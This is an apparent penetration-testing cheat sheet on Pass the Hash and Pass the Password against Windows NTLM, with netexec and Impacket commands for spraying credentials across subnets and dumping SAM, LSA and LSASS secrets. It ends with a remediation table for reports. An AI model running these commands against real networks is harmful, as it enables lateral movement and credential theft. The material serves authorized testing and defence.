# Pass the Hash / Pass the Password

> **Note:** CrackMapExec is deprecated — use **netexec** (`nxc`) instead.
> Update netexec: `cd /opt/Netexec && git pull && pipx reinstall .`

---

## What Is It and Why Does It Work?

When Windows authenticates over the network using NTLM, it never sends or verifies the plaintext password. Instead, it sends a **hash-based proof**: the server sends a challenge, the client signs it with the NT hash, and sends back the response. The server does not care what the original password was — it just verifies the hash math.

**This means: if you have the NT hash, you can authenticate as that user without ever knowing their password.** You are not cracking anything — you are giving Windows exactly what it expects.

This works against:
- SMB (file shares, psexec, nxc)
- WinRM (evil-winrm)
- RDP (with `Restricted Admin Mode` enabled)
- Many other NTLM-capable services

- `(Pwn3d!)` in output = **local admin** on that machine
- **Only NT hashes can be passed.** The NT hash is the MD4 hash of the user's password, stored in SAM/NTDS (16 bytes, 32 hex characters). NetNTLMv2 hashes captured by Responder are challenge-response authentication exchanges — not password hashes. They must be cracked offline or relayed, never passed directly. Don't confuse "NT hash" (password hash) with "NTLMv1/NTLMv2" (auth protocols that use the NT hash).

---

## Pass the Password

```sh
# Spray password across entire subnet
netexec smb <ip/cidr> -u <user> -d <domain> -p <password>

# Local auth (if domain isn't working)
netexec smb <ip/cidr> -u <user> -p <password> --local-auth
```

---

## Pass the Hash

```sh
# Spray NTLM hash across subnet
netexec smb <ip/cidr> -u <user> -H <NTLM-hash> --local-auth

# Domain context
netexec smb <ip/cidr> -u <user> -H <NTLM-hash> -d <domain>
```

---

## Dumping After Pwn3d

### Enumerate Shares
```sh
netexec smb <ip/cidr> -u <user> -H <hash> --local-auth --shares
```

### Dump SAM (Local Hashes)
```sh
netexec smb <ip/cidr> -u <user> -H <hash> --local-auth --sam
```

### Dump LSA (Local Security Authority Secrets)
```sh
netexec smb <ip/cidr> -u <user> -H <hash> --local-auth --lsa
```

### Dump LSASS (with Lsassy module)
```sh
netexec smb <ip/cidr> -u <user> -H <hash> --local-auth -M lsassy
```

### secretsdump (Impacket)
```sh
# Dump SAM from remote machine (needs local admin creds)
secretsdump.py <domain>/<user>:<password>@<target-ip>

# Using hash
secretsdump.py <domain>/<user>@<target-ip> -hashes :<NTLM-hash>
```

---

## nxcdb (NetExec Database)

NetExec stores all results in a local database:
```sh
nxcdb
```
Shows all hosts, credentials, and pwned machines from previous runs.

---

## Mitigation / Remediation (For Report Writing)

**Root cause:** NTLM authentication is hash-based by design, and local admin accounts often share the same password across machines (set once via GPO, never rotated).

| Finding | Remediation |
|---|---|
| Same local admin password across machines | Deploy **LAPS** (Local Administrator Password Solution) — randomizes local admin password per machine, so a compromised hash on one machine does not work on any other |
| PTH from domain account | Enable **Protected Users** security group for privileged accounts — forces Kerberos-only auth, blocks NTLM |
| NTLM used at all | Set GPO: `Network security: LAN Manager authentication level` → `Send NTLMv2 response only. Refuse LM & NTLM` — forces NTLMv2 minimum, and ideally restrict NTLM entirely to force Kerberos |
| SeDebugPrivilege allowing LSASS dump | Remove unnecessary privileges; enable **LSA Protection** (`RunAsPPL`) so LSASS cannot be read without a signed driver |
| Local admin on too many machines | Audit local admin group membership across all machines; implement tiered admin model |

**Key point for reports:** PTH is only possible because local admin passwords are reused. LAPS alone eliminates most PTH lateral movement paths at the workstation level.
